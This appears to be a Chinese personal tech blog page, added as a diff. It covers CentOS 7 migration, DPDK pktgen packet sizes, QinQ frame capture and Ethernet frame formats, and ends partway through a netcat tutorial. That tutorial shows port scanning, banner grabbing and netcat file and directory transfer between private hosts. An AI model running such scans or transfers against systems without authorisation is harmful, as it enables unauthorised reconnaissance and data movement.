@@ -1,0 +1,1720 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>memoryboxes blog</title>
+  <meta name="author" content="memoryboxes">
+
+  
+  <meta name="description" content="memorybox个人博客">
+  <meta name="keywords" content="Python, Docker, MongoDB, Web, 煤矿">
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://memoryboxes.github.io/blog/page/4">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="memoryboxes blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//libs.baidu.com/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.lug.ustc.edu.cn/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.lug.ustc.edu.cn/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">memoryboxes blog</a></h1>
+  
+    <h2>Been here so long got to calling it home．</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="memoryboxes.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+<li><a href="/"><i class="fa fa-home"></i> 主页</a></li>
+  <li><a href="/blog/2015/03/03/huarongdao/"><i class="fa fa-flask"></i>Android开发</a></li>
+  <li><a href="/blog/archives"><i class="fa fa-list-ul"></i>存档</a></li>
+  <li><a href="/about">关于</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/12/22/migrate-centos7-from-centos6/">Migrate Centos7 From Centos6</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-12-22T11:58:43+08:00" pubdate data-updated="true">Dec 22<span>nd</span>, 2015</time>
+        
+           | <a href="/blog/2015/12/22/migrate-centos7-from-centos6/#disqus_thread"
+             data-disqus-identifier="http://memoryboxes.github.io/blog/2015/12/22/migrate-centos7-from-centos6/">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>工作环境切换到Centos7 半年有余，epel仓库里的软件版本比el6更新了不少，非常方便。</p>
+
+<p>另外systemd的引入让很多程序，尤其是开机启动上，速度提升了不少。</p>
+
+<p>总体来说，很多细节让你感觉很舒服，值得大家尽快切换到这个版本上了。</p>
+
+<p>下面记一下从Centos6迁移到Centos7上 常见的Question:</p>
+
+<h2>Q: 为什么引入systemd 代替 SysV init，我就是习惯原来的 /etc/init.d/xxxx 的方法?</h2>
+
+<p>A: 在我看来，有两点:</p>
+
+<ol>
+<li><p> 快。 真的是快，嗖嗖的快</p></li>
+<li><p> 日志。 终于能取代syslog了，我对syslog素无好感，配置复杂，level巨多，还不好排障。</p></li>
+</ol>
+
+
+<p>参考资料:</p>
+
+<p><a href="http://www.ibm.com/developerworks/cn/linux/1407_liuming_init3/">http://www.ibm.com/developerworks/cn/linux/1407_liuming_init3/</a></p>
+
+<p><a href="https://wiki.archlinux.org/index.php/Systemd">https://wiki.archlinux.org/index.php/Systemd</a></p>
+
+<h2>Q: 为什么网卡名字这么奇怪，我要原来的简单明了的办法!!!</h2>
+
+<p>A: 呃，好吧，我觉得虽然有一堆理由，但是网卡名字这个改变可能真的是没有产品经理的弊端。你想回到从前，很简单:</p>
+
+<ul>
+<li><p>在 grub 加入 net.ifnames=0 and biosdevname=0 作为内核参数</p></li>
+<li><p>在 /etc/sysconfig/network-scripts/ 内把你的网络卡配置文件换名为 ifcfg-ethX</p></li>
+<li><p>假若你拥有多个界面并希望控制每个设备的名称，不想由内核作主，你似乎有必要通过 /etc/udev/rules.d/60-net.rules 盖过 /usr/lib/udev/rules.d/60-net.rules。</p></li>
+</ul>
+
+
+<h2>Q: grub.cfg 文件生成怎么这个奇怪，还要先配置 /etc/default/grub，再用命令生成一遍？我要直接改!!</h2>
+
+<p>A:  醒醒吧，我对这个改动双手赞成，至少她解决了centos6上一直被人诟病的efi问题。</p>
+
+<h2>Q: 嗯，我想问，ifconfig和 netstat哪里去了?</h2>
+
+<p>A: 额，套用官方原话回答吧:</p>
+
+<p>ifconfig 及 netstat 工具程序在 CentOS 5 及 6 的应用手册内被置标为降级已接近十年，而 Redhat 决定在 CentOS 7 不会缺省安装 net-utils 组件。取而代之的工具是 ss 和 ip 。假如你真的、真的很需要 ifconfig 和 netstat，你可执行 yum install net-utils。</p>
+
+<p>更多请参考：</p>
+
+<p><a href="https://wiki.centos.org/zh/FAQ/CentOS7#head-d04a9f331b47791774aefd7c11371934e7350ab3">https://wiki.centos.org/zh/FAQ/CentOS7#head-d04a9f331b47791774aefd7c11371934e7350ab3</a></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/10/28/send-large-packet-by-dpdk-pktgen/">Send Large Packet by Dpdk Pktgen</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-10-28T17:11:10+08:00" pubdate data-updated="true">Oct 28<span>th</span>, 2015</time>
+        
+           | <a href="/blog/2015/10/28/send-large-packet-by-dpdk-pktgen/#disqus_thread"
+             data-disqus-identifier="http://memoryboxes.github.io/blog/2015/10/28/send-large-packet-by-dpdk-pktgen/">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h2>场景</h2>
+
+<p>测试qinq 发包，但是tcpreplay是没法带vlan tag的。所以需要用pktgen发送qinq包。</p>
+
+<h2>问题</h2>
+
+<p>qinq双层vlan tag，有些包大小超过了1518字节，pktgen不支持。</p>
+
+<h2>解决方案</h2>
+
+<p>修改 dpdk-2.1.0/x86_64-native-linuxapp-gcc/include/rte_ether.h:</p>
+
+<pre><code>#define ETHER_MAX_LEN 1522
+</code></pre>
+
+<p>重新编译DPDK，Pktgen，重新加载DPDK驱动</p>
+
+<h2>资料</h2>
+
+<ul>
+<li>DPDK2.1.0:</li>
+</ul>
+
+
+<p><a href="http://dpdk.org/browse/dpdk/snapshot/dpdk-2.1.0.tar.gz">http://dpdk.org/browse/dpdk/snapshot/dpdk-2.1.0.tar.gz</a></p>
+
+<ul>
+<li>Pktgen2.9.5:</li>
+</ul>
+
+
+<p><a href="http://dpdk.org/browse/apps/pktgen-dpdk/snapshot/pktgen-dpdk-pktgen-2.9.5.tar.gz">http://dpdk.org/browse/apps/pktgen-dpdk/snapshot/pktgen-dpdk-pktgen-2.9.5.tar.gz</a></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/10/28/capture-qinq-large-packets/">Capture QinQ Large Packets</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-10-28T17:06:26+08:00" pubdate data-updated="true">Oct 28<span>th</span>, 2015</time>
+        
+           | <a href="/blog/2015/10/28/capture-qinq-large-packets/#disqus_thread"
+             data-disqus-identifier="http://memoryboxes.github.io/blog/2015/10/28/capture-qinq-large-packets/">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>最近遇到一个QinQ的问题，总结一下。</p>
+
+<p>对QinQ协议的交换机做Span，tcpdump抓包后发现，有一些包大小为1522字节，这些包都被网卡丢掉了。仔细排查后发现，网卡对于>1518的包，统一丢掉处理了。</p>
+
+<p>简单的解决办法，就是将网卡的mtu增大，设置为1508或者直接1600，就OK了。</p>
+
+<p>事情虽小，但还是有不少知识点的，归纳一下:</p>
+
+<h1>QinQ</h1>
+
+<h2>简介</h2>
+
+<p>IEEE 802.1ad或称为QinQ、vlan stacking。是一种以802.1Q为基础衍生出来的通讯协定。</p>
+
+<p>QinQ报文有固定的格式，就是在802.1Q的标签之上再打一层802.1Q标签，QinQ报文比正常的802.1Q报文多4个字节。这4个字节用作外层标签，即运营商网络的公网VLAN Tag。原802.1Q的Tag用作内层标签，即私网VLAN Tag。</p>
+
+<p>可以参考这张图:</p>
+
+<p><a href="https://zh.wikipedia.org/wiki/IEEE_802.1ad#/media/File:TCPIP_802.1ad_DoubleTag.svg">https://zh.wikipedia.org/wiki/IEEE_802.1ad#/media/File:TCPIP_802.1ad_DoubleTag.svg</a></p>
+
+<p>QinQ的出现，扩充了原始的vlan个数，由4094 &ndash;> 4094*4094。</p>
+
+<p>QinQ的作用，在大规模组网时，或者建立Paas云时，可以允许不同的租户设置相同的vlan id。</p>
+
+<p>并不是所有的交换机都支持QinQ的，QinQ只是一个草案，需要交换机厂商的支持。</p>
+
+<h2>下面从wiki上摘抄一个典型例子:</h2>
+
+<p>Acme及XYZ分别在Seattle及Tacoma有一间分公司，并借由SP的L2 VPN网络连线，而他们的子公司都使用相同的LAN。 换句话说，我们可以假设，Acme使用VLAN 100-200并透过SP连结两间子公司的网络；XYZ也使用VLAN 100-200并使用SP的网络连结子公司。</p>
+
+<p>而对SP而言，则必须想办法区隔Acme及XYZ的资料，使其有办法通过SP的网络并分别送至各自的子公司。</p>
+
+<p>解决办法就是，使用VLAN STACKING来区隔Acme及XYZ的资料。</p>
+
+<p>当Acme送出资料时，SP使用QinQ并给予该资料一个独特的SPVID 1001，使其能通过SP的网络并流向另外一间子公司，当到达子公司则移除该SPVID，该资料便能依照原始的VLAN ID进行传送。而XYZ送出资料时，SP则使用SPVID 1002来区隔。</p>
+
+<h2>包长</h2>
+
+<p>QinQ比正常的报文多了4个字节，所以QinQ报文，在链路层，最大包长到了1522个字节。</p>
+
+<p>标准的Ethernet V2中，IP报文最大不超过1500字节，加上DA+SA+TYPE+DATA+PAD， 链路层的以太网帧最小为60字节，最大为1514字节，如果是802.1q，带有vlan tag，会有1518字节。</p>
+
+<p>QinQ的最大包长明显超出了，在大多数网卡驱动中，默认配置下，这种包是会被丢弃掉的。好在交换机会自动处理这种情况，确保包最终到我们的网卡时，是符合Ethernet V2的。</p>
+
+<p>但是直接对交换机端口做Span，网卡便傻掉了。</p>
+
+<p>阅读linux tg3驱动源码发现，丢弃此类包的判断是很简单的:</p>
+
+<pre><code>10188         /* MTU + ethernet header + FCS + optional VLAN tag */
+10189         tw32(MAC_RX_MTU_SIZE,
+10190              tp-&gt;dev-&gt;mtu + ETH_HLEN + ETH_FCS_LEN + VLAN_HLEN);
+10191
+</code></pre>
+
+<p><a href="http://lxr.free-electrons.com/source/drivers/net/ethernet/broadcom/tg3.c#L88">http://lxr.free-electrons.com/source/drivers/net/ethernet/broadcom/tg3.c#L88</a></p>
+
+<p>所以只要把网卡的mtu改改大就可以了:</p>
+
+<pre><code>ifconfig ethx mtu 1600 up
+</code></pre>
+
+<h1>再说说以太网帧的大小</h1>
+
+<p>根据rfc894的说明，以太网封装IP数据包的最大长度是1500字节，也就是说以太网最大帧长应该是以太网首部加上1500，再加上7字节的前导同步码和1字节的帧开始定界符，具体就是：7字节前导同步码 + 1字节帧开始定界符 + 6字节的目的MAC + 6字节的源MAC + 2字节的帧类型 + 1500 + 4字节的FCS。</p>
+
+<p>按照上述，最大帧应该是1526字节，但是实际上我们抓包得到的最大帧是1514字节，为什么不是1526字节呢？</p>
+
+<p>原因是当数据帧到达网卡时，在物理层上网卡要先去掉前导同步码和帧开始定界符，然后对帧进行CRC检验，如果帧校验和出错，就丢弃此帧。如果校验和正确，就判断帧的目的硬件地址是否符合自己的接收条件（目的地址是自己的物理硬件地址、广播地址、可接收的多播硬件地址等），如果符合，就将帧交给“设备驱动程序”做进一步处理。这时我们抓包的软件才能抓到数据，因此，抓包软件抓到的是去掉前导同步码、帧开始分界符、FCS之外的数据，其最大值是6 + 6 + 2 + 1500 = 1514。</p>
+
+<p>以太网规定，以太网帧数据域部分最小为46字节，也就是以太网帧最小是 6 + 6 + 2 + 46 + 4 = 64。除去4个字节的FCS，因此，抓包时就是60字节。当数据字段的长度小于46字节时，MAC子层就会在数据字段的后面填充以满足数据帧长不小于64 字节。由于填充数据是由MAC子层负责，也就是设备驱动程序。不同的抓包程序和设备驱动程序所处的优先层次可能不同，抓包程序的优先级可能比设备驱动程序更高，也就是说，我们的抓包程序可能在设备驱动程序还没有填充不到64字节帧的时候，已经捕获了数据。因此不同的抓包工具抓到的数据帧的大小可能不同。（比如，wireshark抓到的可能没有填充数据段，而sniffer抓到的就有填充数据段）</p>
+
+<h1>那么以太网帧格式一共有多少种呢</h1>
+
+<p>历史上以太网帧格式有五种:</p>
+
+<h2>1 Ethernet V1</h2>
+
+<p>这是最原始的一种格式，是由Xerox PARC提出的3Mbps CSMA/CD以太网标准的封装格式，后来在1980年由DEC，Intel和Xerox标准化形成Ethernet V1标准</p>
+
+<h2>2 Ethernet II即DIX 2.0</h2>
+
+<p>Xerox与DEC、Intel在1982年制定的以太网标准帧格式。Cisco名称为：ARPA。</p>
+
+<p>这是最常见的一种以太网帧格式，也是今天以太网的事实标准，由DEC，Intel和Xerox在1982年公布其标准，主要更改了Ethernet V1的电气特性和物理接口，在帧格式上并无变化；</p>
+
+<p>Ethernet V2出现后迅速取代Ethernet V1成为以太网事实标准；
+Ethernet V2帧头结构为6bytes的源地址+6bytes的目标地址+2Bytes的协议类型字段+数据。 常见协议类型如下：</p>
+
+<ul>
+<li>0800       IP</li>
+<li>0806       ARP</li>
+<li>0835       RARP</li>
+<li>8137       Novell IPX</li>
+<li>809b       Apple Talk</li>
+</ul>
+
+
+<p>如果协议类型字段取值为0000-05dc(十进制的0-1500)，则该帧就不是Ethernet V2(ARPA)类型了，而是下面讲到的三种802.3帧类型之一；Ethernet可以支持TCP/IP，Novell IPX/SPX，Apple Talk Phase I等协议；RFC 894定义了IP报文在Ethernet V2上的封装格式；</p>
+
+<p>下面给一张图，就对这种帧格式一目了然了:</p>
+
+<pre><code>+-----+-----+------+-----+-------+------+------+-------+
+|PR   |SD   |DA    |SA   |TYPE   |DATA  |PAD   |FCS    |
++-----+-----+------+-----+-------+------+------+-------+
+|56b  |8b   |48b   |48b  |16b    |&lt;=1500|不够   | 32b   |
+|     |     |      |     |       |      |填充   |       |
++-----+-----+------+-----+-------+------+------+-------+
+</code></pre>
+
+<p>在每种格式的以太网帧的开始处都有64比特（8字节）的前导字符，如图所示。其中，前7个字节称为前同步码（Preamble），内容是16进制数0xAA，最后1字节为帧起始标志符0xAB，它标识着以太网帧的开始。前导字符的作用是使接收节点进行同步并做好接收数据帧的准备。</p>
+
+<ul>
+<li><p>PR：同步位，用于收发双方的时钟同步，同时也指明了传输的速率（10M和100M的时钟频率不一样，所以100M网卡可以兼容10M网卡），是56位的二进制数101010101010&hellip;..</p></li>
+<li><p>SD: 分隔位,表示下面跟着的是真正的数据,而不是同步时钟,为8位的10101011,跟同步位不同的是最后2位是11而不是10.</p></li>
+<li><p>DA:目的地址,以太网的地址为48位(6个字节)二进制地址,表明该帧传输给哪个网卡.如果为FFFFFFFFFFFF,则是广播地址,广播地址的数据可以被任何网卡接收到.</p></li>
+<li><p>SA:源地址,48位,表明该帧的数据是哪个网卡发的,即发送端的网卡地址,同样是6个字节.</p></li>
+<li><p>TYPE：类型字段，表明该帧的数据是什么类型的数据，不同的协议的类型字段不同。如：0800H 表示数据为IP包，0806H 表示数据为ARP包，814CH是SNMP包,8137H为IPX/SPX包，（小于0600H的值是用于IEEE802的，表示数据包的长度。）</p></li>
+<li><p>DATA：数据段 ，该段数据不能超过1500字节。因为以太网规定整个传输包的最大长度不能超过1514字节。（14字节为DA，SA，TYPE）</p></li>
+<li><p>PAD：填充位。由于以太网帧传输的数据包最小不能小于60字节, 除去（DA，SA，TYPE 14字节），还必须传输46字节的数据，当数据段的数据不足46字节时，后面补000000&hellip;..(当然也可以补其它值)</p></li>
+<li><p>FCS:32位数据校验位.为32位的CRC校验,该校验由网卡自动计算,自动生成,自动校验,自动在数据段后面填入.对于数据的校验算法,我们无需了解.</p></li>
+</ul>
+
+
+<p>事实上,PR,SD,PAD,FCS这几个数据段我们不用理它 ,它是由网卡自动产生的,我们要理的是DA,SA,TYPE,DATA四个段的内容.</p>
+
+<p>所有数据位的传输由低位开始(但传输的位流是用曼彻斯特编码的)</p>
+
+<p>以太网的冲突退避算法就不介绍了,它是由硬件自动执行的.</p>
+
+<p>DA+SA+TYPE+DATA+PAD最小为60字节,最大为1514字节.</p>
+
+<p>以太网卡可以接收三种地址的数据,一个是广播地位,一个是多播地址(我们用不上),一个是它自已的地址.但网卡也可以设置为接收任何数据包(用于网络分析和监控).</p>
+
+<p>任何两个网卡的物理地址都是不一样的,是世界上唯一的,网卡地址由专门机构分配.不同厂家使用不同地址段,同一厂家的任何两个网卡的地址也是唯一的.根据网卡的地址段(网卡地址的前三个字节),可以知道网卡的生产厂家.有些网卡的地址也可以由用户去设定,但一般不需要.</p>
+
+<h2>3 Ethernet 802.3 raw帧格式</h2>
+
+<p>在Ethernet 802.3 raw类型以太网帧中，原来Ethernet II类型以太网帧中的类型字段被&#8221;总长度&#8221;字段所取代，它指明其后数据域的长度，其取值范围为：46-1500。</p>
+
+<p>接下来的2个字节是固定不变的16进制数0xFFFF，它标识此帧为Novell以太类型数据帧。</p>
+
+<p>这种格式的来源历史非常晦涩，这是1983年Novell发布其划时代的Netware/86网络套件时采用的私有以太网帧格式，该格式以当时尚未正式发布的802.3标准为基础；但是当两年以后IEEE正式发布802.3标准时情况发生了变化—IEEE在802.3帧头中又加入了802.2 LLC(Logical Link Control)头，这使得Novell的RAW 802.3格式跟正式的IEEE 802.3标准互不兼容；可以看到在Novell的RAW 802.3帧结构中并没有标志协议类型的字段，而只有Length 字段(2bytes,取值为0000-05dc，即十进制的0-1500)，因为RAW 802.3帧只支持IPX/SPX一种协议；</p>
+
+<h2>4 Ethernet 802.3 SAP帧格式</h2>
+
+<p>这种帧格式属于 IEEE 802.3/802.2 LLC 标准。</p>
+
+<p>在Ethernet 802.3 SAP帧中，将原Ethernet 802.3 raw帧中2个字节的0xFFFF变为各1个字节的DSAP和SSAP，同时增加了1个字节的&#8221;控制&#8221;字段，构成了802.2逻辑链路控制（LLC）的首部。LLC提供了无连接（LLC类型1）和面向连接（LLC类型2）的网络服务。LLC1是应用于以太网中，而LLC2应用在IBM SNA网络环境中。</p>
+
+<p>新增的802.2 LLC首部包括两个服务访问点：源服务访问点（SSAP）和目标服务访问点（DSAP）。它们用于标识以太网帧所携带的上层数据类型，如16进制数0x06代表IP协议数据，16进制数0xE0代表Novell类型协议数据，16进制数0xF0代表IBM NetBIOS类型协议数据等。</p>
+
+<p>常见SAP值:</p>
+
+<ul>
+<li><p>0  Null LSAP</p></li>
+<li><p>4  SNA Path Control</p></li>
+<li><p>6  DOD IP</p></li>
+<li><p>AA: SNAP</p></li>
+<li><p>FE: ISO DIS</p></li>
+<li><p>FF: Global DSAP</p></li>
+</ul>
+
+
+<p>&hellip;&hellip;</p>
+
+<p>SAP值用以标志上层应用，但是每个SAP字段只有8bits长，而且其中仅保留了6比特用于标识上层协议，因此所能标识的协议数有限(不超过32种)；并且IEEE拒绝为某些重要的协议比如ARP协议定义SAP值(奇怪的是同时他们却定义了IP的SAP值)；因此802.3/802.2 LLC的使用有很大局限性；</p>
+
+<p>至于1个字节的&#8221;控制&#8221;字段，则基本不使用（一般被设为0x03，指明采用无连接服务的802.2无编号数据格式）。</p>
+
+<h2>5 Ethernet 802.3 SNAP帧格式</h2>
+
+<p>Ethernet 802.3 SNAP类型以太网帧格式和Ethernet 802.3 SAP类型以太网帧格式的主要区别在于:</p>
+
+<ul>
+<li><p>2个字节的DSAP和SSAP字段内容被固定下来，其值为16进制数0xAA。</p></li>
+<li><p>1个字节的&#8221;控制&#8221;字段内容被固定下来，其值为16进制数0x03。</p></li>
+<li><p>增加了SNAP字段，由下面两项组成</p>
+
+<ul>
+<li><p>新增了3个字节的组织唯一标识符（Organizationally Unique Identifier，OUI ID）字段，其值通常等于MAC地址的前3字节</p></li>
+<li><p>增加了表示上层协议的类型</p></li>
+</ul>
+</li>
+</ul>
+
+
+<p>这是IEEE为保证在802.2 LLC上支持更多的上层协议同时更好的支持IP协议而发布的标准，与802.3/802.2 LLC一样，802.3/802.2 SNAP也带有LLC头，但是扩展了LLC属性，新添加了一个2Bytes的协议类型域（同时将SAP的值置为AA），从而使其可以标识更多的上层协议类型；另外添加了一个3Bytes的OUI字段用于代表不同的组织，RFC 1042定义了IP报文在802.2网络中的封装方法和ARP协议在802.2 SANP中的实现；</p>
+
+<h2>一点资料</h2>
+
+<p>关于802.3 的标准，历史真是晦暗不明，看wiki都看不出个所以然来，我只能简单列举一下资料:</p>
+
+<p><a href="https://en.wikipedia.org/wiki/Ethernet_frame#Novell_raw_IEEE_802.3">https://en.wikipedia.org/wiki/Ethernet_frame#Novell_raw_IEEE_802.3</a></p>
+
+<p><a href="http://lostintransit.se/2012/06/06/the-history-of-ethernet-dix-vs-802-3/">http://lostintransit.se/2012/06/06/the-history-of-ethernet-dix-vs-802-3/</a></p>
+
+<h1>一点小tip</h1>
+
+<p>Q: MTU最大可以设置为多大?</p>
+
+<p>A: 9000，这是由CRC校验的能力决定的。参考:</p>
+
+<p><a href="https://en.wikipedia.org/wiki/Jumbo_frame">https://en.wikipedia.org/wiki/Jumbo_frame</a></p>
+
+<p>PS:早期的一些网络，比如超通道，可以支持65535的mtu，但是已经湮没于历史风尘中了。</p>
+
+<h1>参考:</h1>
+
+<p><a href="https://zh.wikipedia.org/wiki/IEEE_802.1ad">https://zh.wikipedia.org/wiki/IEEE_802.1ad</a></p>
+
+<p><a href="https://en.wikipedia.org/wiki/Ethernet_frame">https://en.wikipedia.org/wiki/Ethernet_frame</a></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/08/26/netcat-command/">Netcat Command</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-08-26T09:07:48+08:00" pubdate data-updated="true">Aug 26<span>th</span>, 2015</time>
+        
+           | <a href="/blog/2015/08/26/netcat-command/#disqus_thread"
+             data-disqus-identifier="http://memoryboxes.github.io/blog/2015/08/26/netcat-command/">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Netcat能做到的事情太多了，但和tcpdump一个流派，参数多的令人发指，拣常用的几个命令记录一下</p>
+
+<h2>场景</h2>
+
+<p>Server A: 192.168.100.100</p>
+
+<p>Server B: 192.168.100.101</p>
+
+<h3>端口扫描</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -z -v -n 192.168.100.100 21-25</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.</li>
+<li>z 参数告诉Netcat使用Zero IO,指的是一旦连接关闭，不进行数据交换</li>
+<li>v 参数指使用冗余选项</li>
+<li>n 参数告诉Netcat 不要使用DNS反向查询IP地址的域名</li>
+</ul>
+
+
+<p>一旦你发现开放的端口，你可以容易的使用Netcat 连接服务抓取他们的banner。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v 192.168.100.100 21</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>消息传送</h4>
+
+<p>两台机器间消息传输</p>
+
+<p>SERVER A:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -l 1234</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Netcat 命令在1567端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。</p>
+
+<p>SERVER B:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc 192.168.100.100 1234</span></code></pre></td></tr></table></div></figure>
+
+
+<p>不管你在机器B上键入什么都会出现在机器A上</p>
+
+<h4>文件传输</h4>
+
+<p>大部分时间中，我们都在试图通过网络或者其他工具传输文件。有很多种方法，比如FTP,SCP,SMB等等，但是当你只是需要临时或者一次传输文件，真的值得浪费时间来安装配置一个软件到你的机器上嘛。假设，你想要传一个文件file.txt 从A 到B。A或者B都可以作为服务器或者客户端，以下，让A作为服务器，B为客户端。</p>
+
+<p>SERVER A:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -l 1234 &lt; file.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>SERVER B:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -n 192.168.100.100 1234 &gt; file.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>这里我们创建了一个服务器在A上并且重定向Netcat的输入为文件file.txt，那么当任何成功连接到该端口，Netcat会发送file的文件内容。</p>
+
+<p>在客户端我们重定向输出到file.txt，当B连接到A，A发送文件内容，B保存文件内容到file.txt.</p>
+
+<p>没有必要创建文件源作为Server，我们也可以相反的方法使用。像下面的我们发送文件从B到A，但是服务器创建在A上，这次我们仅需要重定向Netcat的输出并且重定向B的输入文件。</p>
+
+<p>B作为Server</p>
+
+<p>SERVER B:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -l 1234 &gt; file.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>SERVER A:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc 192.168.100.101 1234 &lt; file.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>目录传输</h4>
+
+<p>发送一个文件很简单，但是如果我们想要发送多个文件，或者整个目录，一样很简单，只需要使用压缩工具tar，压缩后发送压缩包。</p>
+
+<p>如果你想要通过网络传输一个目录从A到B。</p>
+
+<p>SERVER A:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tar -cvf – dir_name | nc -l 1234</span></code></pre></td></tr></table></div></figure>
+
+
+<p>SERVER B:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -n 192.168.159.100 1234 | tar -xvf -</span></code></pre></td></tr></table></div></figure>
+
+
+<p>这里在A服务器上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给Netcat，Netcat可以通过网络发送它。</p>
+
+<p>在客户端我们下载该压缩包通过Netcat 管道然后打开文件。</p>
+
+<p>如果想要节省带宽传输压缩包，我们可以使用bzip2或者其他工具压缩。</p>
+
+<p>SERVER A:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tar -cvf – dir_name| bzip2 -z | nc -l 1234</span></code></pre></td></tr></table></div></figure>
+
+
+<p>通过bzip2压缩</p>
+
+<p>SERVER B:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -n 192.168.100.100 1234 | bzip2 -d |tar -xvf -</span></code></pre></td></tr></table></div></figure>
+
+
+<p>使用bzip2解压</p>
+
+<h4>加密你通过网络发送的数据</h4>
+
+<p>如果你担心你在网络上发送数据的安全，你可以在发送你的数据之前用如mcrypt的工具加密。</p>
+
+<p>SERVER A:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc 192.168.100.101 1234 | mcrypt –flush –bare -F -q -d -m ecb &gt; file.txt</span></code></pre></td></tr></table></div></figure>
+
+
